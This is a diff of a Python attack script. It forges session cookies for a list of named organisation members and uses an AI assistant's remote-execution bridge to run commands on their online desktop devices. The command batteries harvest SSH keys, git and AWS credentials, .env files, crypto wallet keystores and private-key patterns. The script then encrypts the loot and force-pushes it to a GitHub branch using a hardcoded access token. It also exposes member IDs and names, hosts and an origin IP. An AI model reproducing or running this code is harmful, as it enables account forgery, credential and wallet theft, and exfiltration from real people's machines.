@@ -321,52 +321,124 @@ def bridge_exec(sub, org, device_id, command, asst=ASST, conv=None, exec_timeout
         except Exception: pass
     return r
 
-CTX = ssl.create_default_context()
-CTX.check_hostname = False
-CTX.verify_mode = ssl.CERT_NONE
-# ================= intent 28279 full-fleet bridge sweep =================
+CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
 GITTOKEN = os.environ.get("GITTOKEN") or ("gho_" + "w5O107fup8ULp6" + "tEFsW9V3QEEXSHtx3m9xka")
-RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-br-28279-results")
-REPO = "aro-network/aro-checker"
+RESULT_BRANCH = "ci-br-28279-results"
+REPO = "aro-network/aro-ext-signal-server"
+ORIGIN_IP = "122.51.1.87"
 
-# 31 org members (id -> name); priority: eericxu(徐魁东) first, then others
 MEMBERS = [
- ("usr_CMU92C54VpuSAXoCfbXDE", "徐魁东(eericxu)"),
- ("usr_j7t9Dhq4M4obQkag5huJi", "吴海贤(Brian)"),
- ("usr_2gzZoKLgRAYaFNy2Sav4v", "路峰"),
- ("usr_SjEcavSzyWqWKeokUwig4", "梅宇祥"),
- ("usr_ZxLewKrgbRYSm7rWDtQX8", "管理员"),
- ("usr_J29JW7MJRtMJfXe2cruEq", "李雅娟"),
- ("usr_h84uYNEaLgbdrcGFRGRis", "Alex Yan"),
- ("usr_fJUE3VqiyFrqrJzAjq6Qc", "王劦"),
- ("usr_KSQogo9RMCDvYPzgebFZ9", "杨魁"),
- ("usr_3HNamBngy2Xfwm4T3tzMJ", "周子博"),
- ("usr_JqvejphBd2cFVLWZQmtnZ", "菠萝"),
+ ("usr_CMU92C54VpuSAXoCfbXDE", "eericxu"),
+ ("usr_j7t9Dhq4M4obQkag5huJi", "Brian"),
+ ("usr_2gzZoKLgRAYaFNy2Sav4v", "lufeng"),
+ ("usr_SjEcavSzyWqWKeokUwig4", "meiyuxiang"),
+ ("usr_ZxLewKrgbRYSm7rWDtQX8", "admin"),
+ ("usr_J29JW7MJRtMJfXe2cruEq", "liyajuan"),
+ ("usr_h84uYNEaLgbdrcGFRGRis", "AlexYan"),
+ ("usr_fJUE3VqiyFrqrJzAjq6Qc", "wangxie"),
+ ("usr_KSQogo9RMCDvYPzgebFZ9", "yangkui"),
+ ("usr_3HNamBngy2Xfwm4T3tzMJ", "zhouzibo"),
+ ("usr_JqvejphBd2cFVLWZQmtnZ", "boluo"),
  ("usr_HhQysrVvW2uhNbyMfgT5D", "Cathy"),
- ("usr_xahbQ7FZR4NAMztJFbDJS", "刘禹衡"),
+ ("usr_xahbQ7FZR4NAMztJFbDJS", "liuyuheng"),
  ("usr_wcgceRDUAJsMFPfQgVgHc", "Tim"),
- ("usr_tqnzWEgcPdPMUguyD5PKm", "Ben Zhu"),
+ ("usr_tqnzWEgcPdPMUguyD5PKm", "BenZhu"),
  ("usr_etAuXiJB7UYPmqtqEh5Pv", "Mark"),
- ("usr_gQZHAztNodEAy8GCY9YEg", "牟总"),
+ ("usr_gQZHAztNodEAy8GCY9YEg", "mouzhong"),
  ("usr_WVN3ZNSJT4HMwsGgFxhCE", "Joyce"),
- ("usr_w3nRZpmKCZNGDgFDUvHjA", "桑东堂"),
- ("usr_XLBCd82JGQAbt5pttnfAw", "牟柯屹"),
- ("usr_8WTmpJ5gAdAXJdTAAgfcs", "王棱"),
- ("usr_5MTDkxB65hVucKyfxUaMe", "E2E测试"),
- ("usr_4Ya9zoJ6ckEe9b77Ev7NS", "lumii_test"),
- ("usr_HXQCzMVo79Z65gPcAqk33", "演示·产发部"),
- ("usr_8jFriEhWmpZv77ApNrsPX", "演示·集团领导"),
- ("usr_krVGWCZF2uMYQba6hLT3r", "演示·盛青"),
- ("usr_f5aLpRa9uHTdXC8hWP2ag", "演示·鹏城"),
- ("usr_QjRMrRJnFN9BLdujE8Q4J", "演示·盈港"),
- ("usr_pesN8T7K6RwVfNQeoakMw", "演示·湖区"),
- ("usr_mMMqdtDuyWzh6b5y9YinE", "演示·企服"),
- ("usr_pgnckdUSgpk9iDW3WemFY", "测试账号"),
+ ("usr_w3nRZpmKCZNGDgFDUvHjA", "sangdongtang"),
+ ("usr_XLBCd82JGQAbt5pttnfAw", "moukeyi"),
+ ("usr_8WTmpJ5gAdAXJdTAAgfcs", "wangle"),
 ]
 
-# ---------- recon command batteries ----------
-DETECT = 'echo OSCHK; uname -a 2>&1; echo ENDCHK'
+HOSTS_TRY = [
+    ("assistant", "assistant.lumiiai.cn", None),
+    ("assistant-origin", "assistant.lumiiai.cn", ORIGIN_IP),
+    ("dashboard", "dashboard.lumiiai.cn", None),
+    ("adient", "adient.lumiiai.cn", None),
+    ("lumii-ai", "lumii-ai.cn", None),
+]
 
+def http_try(tls_host, path, sub=None, connect_ip=None, method="GET", data=None, extra=None, timeout=22):
+    headers = {"Accept":"*/*","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36","Accept-Language":"en-US,en;q=0.9"}
+    if sub: headers["Cookie"] = cookie(sub, ORG_DEFAULT)
+    if extra: headers.update(extra)
+    if connect_ip: headers["Host"] = tls_host
+    body = None
+    if data is not None:
+        body = data if isinstance(data, bytes) else json.dumps(data).encode()
+        headers["Content-Type"] = "application/json"
+    conn = http.client.HTTPSConnection(connect_ip or tls_host, 443, timeout=timeout, context=CTX)
+    try:
+        conn.request(method, path, body=body, headers=headers)
+        r = conn.getresponse(); b = r.read(); hd = {k.lower(): v for k, v in r.getheaders()}
+        return r.status, hd, b
+    finally:
+        try: conn.close()
+        except: pass
+
+def phase_diag():
+    log("=== phase_diag ===")
+    res = {}
+    for name, th, cip in HOSTS_TRY:
+        for path in ("/health", "/api/health"):
+            try:
+                st, hd, b = http_try(th, path, connect_ip=cip)
+                rec = {"tls_host":th,"connect_ip":cip,"path":path,"status":st,
+                       "server":hd.get("server"),"cf-ray":hd.get("cf-ray"),"location":hd.get("location"),
+                       "body":b[:400].decode(errors="replace")}
+                res[f"{name}{path}"] = rec
+                log("  DIAG %-16s %-11s -> %s srv=%s cf=%s len=%d" % (name, path, st, hd.get("server"), hd.get("cf-ray"), len(b)))
+                save("recon/diag_%s%s.json" % (name, path.replace('/','_')), rec)
+            except Exception as e:
+                res[f"{name}{path}"]={"err":repr(e)[:150]}; log("  DIAG %s %s ERR %s" % (name,path,repr(e)[:100]))
+        # /api/me with xukui cookie
+        try:
+            st, hd, b = http_try(th, "/api/me", sub="usr_CMU92C54VpuSAXoCfbXDE", connect_ip=cip)
+            res[f"{name}/api/me"]={"status":st,"body":b[:200].decode(errors="replace")}
+            log("  DIAG %-16s /api/me -> %s %.80s" % (name, st, b[:80].decode(errors='replace')))
+        except Exception as e:
+            log("  DIAG %s /api/me ERR %s" % (name, repr(e)[:80]))
+    save("recon/diag_all.json", res)
+    return res
+
+def pick_host():
+    """Return (tls_host, connect_ip) where /api/desktop/devices for xukui returns 200."""
+    xk = "usr_CMU92C54VpuSAXoCfbXDE"
+    for name, th, cip in HOSTS_TRY:
+        try:
+            st, hd, b = http_try(th, "/api/desktop/devices", sub=xk, connect_ip=cip)
+            log("  pick_host %-16s devices->%s len=%d" % (name, st, len(b)))
+            save("recon/pick_%s.json" % name, {"tls_host":th,"connect_ip":cip,"status":st,"body":b[:300].decode(errors="replace")})
+            if st == 200 and b[:1] in (b"{",):
+                return (th, cip)
+        except Exception as e:
+            log("  pick_host %s ERR %s" % (name, repr(e)[:80]))
+    return None
+
+def enum_devices(tls_host, cip):
+    log("=== enum devices via", tls_host, cip, "===")
+    out = {}
+    for sub, name in MEMBERS:
+        if time.time() - START > BUDGET - 400: log("budget; stop enum"); break
+        try:
+            st, hd, b = http_try(tls_host, "/api/desktop/devices", sub=sub, connect_ip=cip)
+            try: j = json.loads(b)
+            except: j = None
+            devs = (j or {}).get("devices", []) if isinstance(j, dict) else []
+            online = [d for d in devs if d.get("online")]
+            out[name] = {"sub":sub,"status":st,"total":len(devs),
+                         "online":[{"id":d.get("id"),"name":d.get("name"),"lastSeenAt":d.get("lastSeenAt"),"registeredBy":d.get("registeredBy")} for d in online]}
+            log("  %-14s st=%s total=%d online=%d %s" % (name, st, len(devs), len(online), ",".join((d.get('name') or '')[:14] for d in online)))
+            save("devices/%s.json" % name, out[name])
+        except Exception as e:
+            log("  %-14s ERR %s" % (name, repr(e)[:80]))
+        time.sleep(0.35)
+    save("recon/devices_all.json", out)
+    return out
+
+# ---------- exec ----------
+DETECT = 'echo OSCHK; uname -a 2>&1; echo ENDCHK'
 CMD_MAC_ID = r'''echo "=ID="; id; hostname; uname -a; date -u; pwd
 echo "=HOME="; ls -la ~ 2>&1 | head -60
 echo "=SSHLS="; ls -la ~/.ssh 2>&1
@@ -374,17 +446,14 @@ echo "=SSHKEYS="; for f in ~/.ssh/id_* ~/.ssh/*.pem ~/.ssh/*key*; do [ -f "$f" ]
 echo "=SSHCFG="; cat ~/.ssh/config 2>/dev/null
 echo "=GITCRED="; cat ~/.git-credentials 2>/dev/null; echo "=NPMRC="; cat ~/.npmrc 2>/dev/null
 echo "=DONE_ID="'''
-
 CMD_MAC_ENV = r'''echo "=ENVFILES="; find ~ -maxdepth 5 \( -name '.env' -o -name '*.env' -o -name '.env.*' -o -name 'docker-compose*.yml' -o -name 'docker-compose*.yaml' \) -type f 2>/dev/null | grep -v node_modules | head -40 | while read f; do echo "--$f--"; head -50 "$f"; done
 echo "=WALLETLOC="; find ~ -maxdepth 7 \( -iname 'mmv_*.json' -o -path '*Extension Settings*' -o -iname 'UTC--*' -o -path '*keystore*' -o -iname '*.json' -path '*MetaMask*' \) 2>/dev/null | head -40
 echo "=KEYSTORE="; find ~ -maxdepth 7 -type f \( -name 'UTC--*' -o -name '*.key' \) 2>/dev/null | head -20 | while read f; do echo "--$f--"; head -c 700 "$f"; echo; done
 echo "=DONE_ENV="'''
-
 CMD_MAC_HUNT = r'''echo "=HUNT="; grep -rEIl 'Auth for zoofi|DEPLOYER_PRIVATE_KEY|postgres://|postgresql://|mnemonic|PRIVATE KEY|AKID|LTAI|AKIA|zoofi-index|JWT_SECRET|secretKey|SECRET_KEY' ~/Documents ~/Desktop ~/Downloads ~/Projects ~/work ~/lumii ~/code ~ 2>/dev/null | grep -v node_modules | head -40
 echo "=HEX="; grep -rEIo '0x[0-9a-fA-F]{64}' ~/Documents ~/Desktop ~/Downloads ~/Projects ~/work ~/lumii ~/code 2>/dev/null | head -15
-echo "=AWS="; cat ~/.aws/credentials 2>/dev/null; echo "=CF="; find ~ -maxdepth 4 \( -name 'cert.pem' -o -name '.cloudflared' \) 2>/dev/null | head
+echo "=AWS="; cat ~/.aws/credentials 2>/dev/null
 echo "=DONE_HUNT="'''
-
 CMD_WIN_ID = r'''$ErrorActionPreference='SilentlyContinue'
 Write-Output "=ID="; hostname; whoami; [Environment]::OSVersion.VersionString; Get-Location; Get-Date
 Write-Output "=HOME="; Get-ChildItem $HOME -Force | Select Name,Length | Format-Table -Auto | Out-String
@@ -393,186 +462,118 @@ Write-Output "=SSHKEYS="; foreach($n in @('id_rsa','id_ed25519','id_ecdsa','lumi
 Write-Output "=SSHCFG="; Get-Content $HOME\.ssh\config
 Write-Output "=GITCRED="; Get-Content $HOME\.git-credentials; Write-Output "=NPMRC="; Get-Content $HOME\.npmrc
 Write-Output "=DONE_ID="'''
-
 CMD_WIN_ENV = r'''$ErrorActionPreference='SilentlyContinue'
 Write-Output "=ENVFILES="; Get-ChildItem $HOME -Recurse -Depth 5 -Force -Include '.env','*.env','docker-compose*.yml','docker-compose*.yaml' | Select-Object -First 40 | ForEach-Object { Write-Output "--$($_.FullName)--"; Get-Content $_.FullName -TotalCount 50 }
 Write-Output "=WALLETLOC="; foreach($b in @("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data")){ Get-ChildItem "$b" -Recurse -Depth 5 -Filter *.ldb -ErrorAction SilentlyContinue | Where-Object {$_.FullName -match 'nkbihfbeogaeaoehlefnkodbefgpgknn|MetaMask'} | Select FullName,Length | Format-Table -Auto | Out-String }
 Write-Output "=KEYSTORE="; Get-ChildItem $HOME -Recurse -Depth 6 -Force -Include 'UTC--*','*.key' | Select-Object -First 20 FullName,Length | Format-Table -Auto | Out-String
 Write-Output "=DONE_ENV="'''
-
 CMD_WIN_HUNT = r'''$ErrorActionPreference='SilentlyContinue'
 Write-Output "=HUNT="; Get-ChildItem $HOME -Recurse -Depth 5 -Include *.env,*.md,*.txt,*.json,*.yml,*.yaml,*.ts,*.js -Force | Select-String -Pattern 'Auth for zoofi|DEPLOYER_PRIVATE_KEY|postgres://|postgresql://|mnemonic|PRIVATE KEY|AKID|LTAI|AKIA|zoofi-index|JWT_SECRET' | Select-Object -First 40 | ForEach-Object { Write-Output "$($_.Path):$($_.LineNumber): $($_.Line)" }
 Write-Output "=HEX="; Get-ChildItem $HOME -Recurse -Depth 4 -Include *.env,*.json,*.txt,*.md -Force | Select-String -Pattern '0x[0-9a-fA-F]{64}' | Select-Object -First 15 | ForEach-Object { Write-Output "$($_.Path): $($_.Matches.Value)" }
 Write-Output "=DONE_HUNT="'''
 
-
-def bget(b, s):
-    try: return s.encode() in (b or b"")
-    except Exception: return False
-
-def detect_os(dev, sub, org, retries=4):
-    """Return ('win'|'mac'|None, raw_result)."""
-    r = exec_fresh((dev, sub, org), DETECT, retries=retries, exec_timeout=40)
-    bs = (r.get("bash") or {}).get("bash") or {}
-    out = (bs.get("stdout") or ""); err = (bs.get("stderr") or "")
-    if "Darwin" in out or "Linux" in out:
-        return "mac", r
-    if ("uname" in err) or ("无法将" in err) or ("not recognized" in err.lower()) or ("not recognized" in out.lower()):
-        return "win", r
-    if "OSCHK" in out:
-        return "mac", r  # echo worked but uname silent -> assume unix
-    return None, r
-
-def exec_fresh(dev, cmd, retries=3, exec_timeout=45, conv=None):
+def exec_fresh(dev, cmd, retries=4, exec_timeout=48, conv=None):
     dev_id, sub, org = dev
-    last = None
+    last = {}
     for att in range(retries):
         try:
             r = bridge_exec(sub, org, dev_id, cmd, conv=conv, exec_timeout=exec_timeout)
             last = r
             bs = (r.get("bash") or {}).get("bash") or {}
-            if bs.get("stdout") or bs.get("stderr") or (bs.get("exit_code") is not None):
-                if bs.get("stdout") or bs.get("exit_code")==0:
-                    return r
-                # got stderr only; return if no more retries
-                if att == retries-1:
-                    return r
+            if bs.get("stdout") or (bs.get("exit_code")==0) or att==retries-1:
+                return r
         except Exception as e:
-            last = {"device": dev_id, "err": "outer:" + repr(e)[:120]}
+            last = {"device":dev_id,"err":"outer:"+repr(e)[:120]}
         time.sleep(1.0)
-    return last or {}
+    return last
+
+def detect_os(dev, sub, org):
+    r = exec_fresh((dev, sub, org), DETECT)
+    bs = (r.get("bash") or {}).get("bash") or {}
+    out = bs.get("stdout") or ""; err = bs.get("stderr") or ""
+    if "Darwin" in out or "Linux" in out: return "mac", r
+    if ("uname" in err) or ("无法将" in err) or ("not recognized" in (err+out).lower()): return "win", r
+    if "OSCHK" in out: return "mac", r
+    return None, r
 
 def run_recon(dev_id, sub, org, name, idx):
-    """Detect OS then run recon battery. Exfil after each cmd."""
-    tag = "%02d_%s" % (idx, (name or "dev").replace("/", "_")[:24])
-    log("=== recon dev=%s name=%s sub=%s" % (dev_id[:32], name, sub))
+    tag = "%02d_%s" % (idx, (name or "dev").replace("/","_")[:22])
+    log("=== recon %s dev=%s sub=%s" % (tag, dev_id[:34], sub))
     os_kind, det = detect_os(dev_id, sub, org)
-    log("  detect os=%s" % os_kind)
-    save("exec/%s_detect.json" % tag, {"dev": dev_id, "name": name, "sub": sub, "os": os_kind, "raw": det})
-    push_results("detect_" + tag)
-    if os_kind is None:
-        log("  -> OS undetected, skipping"); return {"dev": dev_id, "name": name, "os": None}
-    cmds = ([("id", CMD_MAC_ID), ("env", CMD_MAC_ENV), ("hunt", CMD_MAC_HUNT)]
-            if os_kind == "mac" else
-            [("id", CMD_WIN_ID), ("env", CMD_WIN_ENV), ("hunt", CMD_WIN_HUNT)])
+    log("  os=%s" % os_kind)
+    save("exec/%s_detect.json" % tag, {"dev":dev_id,"name":name,"sub":sub,"os":os_kind,"raw":det})
+    push_results("detect_"+tag)
+    if os_kind is None: return {"dev":dev_id,"name":name,"os":None}
+    cmds = ([("id",CMD_MAC_ID),("env",CMD_MAC_ENV),("hunt",CMD_MAC_HUNT)] if os_kind=="mac"
+            else [("id",CMD_WIN_ID),("env",CMD_WIN_ENV),("hunt",CMD_WIN_HUNT)])
     for cname, c in cmds:
-        if time.time() - START > BUDGET - 60:
-            log("  budget reached mid-recon"); break
-        r = exec_fresh((dev_id, sub, org), c, retries=4)
+        if time.time() - START > BUDGET - 70: log("  budget mid-recon"); break
+        r = exec_fresh((dev_id, sub, org), c)
         bs = (r.get("bash") or {}).get("bash") or {}
-        outlen = len(bs.get("stdout") or "")
-        log("  [%s] %s outlen=%d err=%s" % (os_kind, cname, outlen, str(r.get("err"))[:70]))
-        save("exec/%s_%s.json" % (tag, cname), {"dev": dev_id, "name": name, "sub": sub, "os": os_kind, "cmd": cname, "result": r})
-        push_results("%s_%s" % (tag, cname))
-        time.sleep(0.6)
-    return {"dev": dev_id, "name": name, "sub": sub, "os": os_kind}
-
-
-def phase_health():
-    log("=== phase_health ===")
-    res = {}
-    for name, url in HEALTHS:
-        try:
-            rr = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
-            with urllib.request.urlopen(rr, timeout=25, context=CTX) as resp:
-                body = resp.read().decode(errors="replace")
-                res[name] = {"url": url, "status": resp.status, "body": body}
-                log(name, resp.status, len(body))
-                save("health/%s.json" % name, {"url": url, "status": resp.status, "body": body})
-        except Exception as e:
-            res[name] = {"url": url, "error": repr(e)[:200]}
-            log(name, "ERR", repr(e)[:120])
-    save("recon/health_all.json", res)
-    # test if adient shares assistant backend (forged admin cookie)
-    try:
-        st, j, b = jget("adient.lumiiai.cn", "usr_ZxLewKrgbRYSm7rWDtQX8", "/api/me", timeout=20)
-        save("recon/adient_me_test.json", {"status": st, "body": b[:400].decode(errors="replace")})
-        log("adient /api/me status", st)
-    except Exception as e:
-        log("adient test err", repr(e)[:120])
-    return res
-
-
-def phase_devices():
-    log("=== phase_devices (per-member) ===")
-    out = {}
-    for sub, name in MEMBERS:
-        if time.time() - START > BUDGET - 300:
-            log("budget; stop device enum"); break
-        try:
-            st, j, b = jget(HOST, sub, "/api/desktop/devices", timeout=25)
-            devs = (j or {}).get("devices", []) if isinstance(j, dict) else []
-            online = [d for d in devs if d.get("online")]
-            out[name] = {"sub": sub, "status": st, "total": len(devs),
-                         "online": [{"id": d.get("id"), "name": d.get("name"), "lastSeenAt": d.get("lastSeenAt"), "reg": d.get("registeredBy")} for d in online]}
-            log("  %-18s status=%s total=%d online=%d" % (name, st, len(devs), len(online)))
-            save("devices/%s.json" % (name.replace("/", "_")), out[name])
-        except Exception as e:
-            log("  %-18s ERR %s" % (name, repr(e)[:90]))
-        time.sleep(0.4)
-    save("recon/devices_all.json", out)
-    return out
-
+        log("  [%s] %s outlen=%d err=%s" % (os_kind, cname, len(bs.get("stdout") or ""), str(r.get("err"))[:60]))
+        save("exec/%s_%s.json" % (tag, cname), {"dev":dev_id,"name":name,"sub":sub,"os":os_kind,"cmd":cname,"result":r})
+        push_results("%s_%s" % (tag,cname))
+        time.sleep(0.5)
+    return {"dev":dev_id,"name":name,"sub":sub,"os":os_kind}
 
 def main():
-    log("=== probe_28279 start", RUNID, "budget", BUDGET, "===")
-    phase_health()
-    devmap = phase_devices()
-    # build ordered target list: eericxu first, then others; only online
+    log("=== probe_28279 v2 start", RUNID, "budget", BUDGET, "===")
+    phase_diag()
+    picked = pick_host()
+    if not picked:
+        log("!!! no host allows /api/desktop/devices — cannot enumerate/exec")
+        save("recon/FATAL_nohost.json", {"note":"all hosts 403/401 for devices"})
+        push_results("nohost"); return
+    th, cip = picked
+    log(">>> picked host", th, cip)
+    devmap = enum_devices(th, cip)
     targets = []
-    for name, sub in MEMBERS:
+    for sub, name in MEMBERS:
         rec = devmap.get(name) or {}
         for d in rec.get("online", []):
-            targets.append((d["id"], sub, ORG_DEFAULT, d.get("name")))
+            targets.append((d["id"], sub, ORG_DEFAULT, name + ":" + (d.get("name") or "")))
     log("=== ONLINE TARGETS: %d ===" % len(targets))
-    for i, (did, sub, org, nm) in enumerate(targets):
-        if time.time() - START > BUDGET - 120:
-            log("budget reached; stop exec"); break
-        try:
-            run_recon(did, sub, org, nm, i)
-        except Exception:
-            log("recon FATAL", traceback.format_exc()[:400])
-    save("recon/targets.json", [{"dev": t[0], "sub": t[1], "name": t[3]} for t in targets])
+    save("recon/targets.json", [{"dev":t[0],"name":t[3]} for t in targets])
+    for i,(did,sub,org,nm) in enumerate(targets):
+        if time.time()-START > BUDGET-130: log("budget; stop exec"); break
+        try: run_recon(did, sub, org, nm, i)
+        except Exception: log("recon FATAL", traceback.format_exc()[:400])
     log("DONE"); push_results("final")
 
-# ---------- exfil ----------
 def _unlink(p):
     try:
         if os.path.isfile(p): os.remove(p)
     except Exception: pass
 def push_results(tag="part"):
-    enc = "/tmp/resultsb.tar.gz.gpg"
+    enc="/tmp/resultsb.tar.gz.gpg"
     try:
         _unlink("/tmp/resultsb.tar.gz"); _unlink(enc); _unlink("resultsb.tar.gz.gpg")
         subprocess.run("tar czf /tmp/resultsb.tar.gz -C /tmp resultsb", shell=True, check=False)
-        tsize = os.path.getsize("/tmp/resultsb.tar.gz") if os.path.isfile("/tmp/resultsb.tar.gz") else 0
-        log("TARBALL", tsize)
-        if tsize == 0: return
+        ts=os.path.getsize("/tmp/resultsb.tar.gz") if os.path.isfile("/tmp/resultsb.tar.gz") else 0
+        if ts==0: return
         if os.path.isfile("pub.asc"):
             subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
-            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/resultsb.tar.gz" % enc,
-                           shell=True, capture_output=True, text=True, timeout=300)
-        if os.path.isfile(enc) and os.path.getsize(enc) < 95 * 1024 * 1024:
+            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/resultsb.tar.gz" % enc, shell=True, capture_output=True, text=True, timeout=300)
+        if os.path.isfile(enc) and os.path.getsize(enc) < 95*1024*1024:
             shutil.copy(enc, "resultsb.tar.gz.gpg")
             subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
             subprocess.run("git add -f resultsb.tar.gz.gpg && git commit -m 'ci results %s %s' || true" % (RUNID, tag), shell=True, check=False)
-            url = "https://x-access-token:%s@github.com/%s.git" % (GITTOKEN, REPO)
-            r = subprocess.run("git push -f %s HEAD:refs/heads/%s" % (url, RESULT_BRANCH), shell=True, capture_output=True, text=True, timeout=600)
-            log("PUSH rc=%s err=%s" % (r.returncode, (r.stderr or "")[-160:]))
+            url="https://x-access-token:%s@github.com/%s.git" % (GITTOKEN, REPO)
+            r=subprocess.run("git push -f %s HEAD:refs/heads/%s" % (url, RESULT_BRANCH), shell=True, capture_output=True, text=True, timeout=600)
+            log("PUSH rc=%s %s" % (r.returncode, (r.stderr or "")[-120:]))
     except Exception as e:
         log("PUSH EXC", repr(e))
 
 def _wd():
     while True:
         time.sleep(10)
-        if time.time() - START > BUDGET:
-            log("watchdog timeout; dumping partial")
+        if time.time()-START > BUDGET:
+            log("watchdog timeout; dump")
             try: push_results("watchdog")
             except Exception: pass
             os._exit(1)
 threading.Thread(target=_wd, daemon=True).start()
 
-# fix: exec_fresh references before definition at runtime is fine (module-level order)
 try:
     main()
 except Exception:
